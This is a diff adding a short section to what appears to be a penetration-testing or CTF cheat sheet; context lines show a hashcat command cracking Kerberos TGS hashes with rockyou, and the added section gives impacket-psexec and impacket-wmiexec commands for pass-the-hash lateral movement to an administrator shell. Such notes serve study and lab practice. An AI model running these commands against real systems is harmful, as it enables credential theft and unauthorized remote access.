@@ -37,4 +37,14 @@ hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 ```
 
 
+## Pass Admin hash psexec
+
+Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:
+
+```
+impacket-psexec -hashes 00000000000000000000000000000000:${NTLM_HASH} Administrator@$RHOST
+```
+Format is `${LM_HASH}:${NT_HASH}` - when using the NTLM hash, just put `32 * 0` in the `LM_HASH` section.
+
+a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM.
 
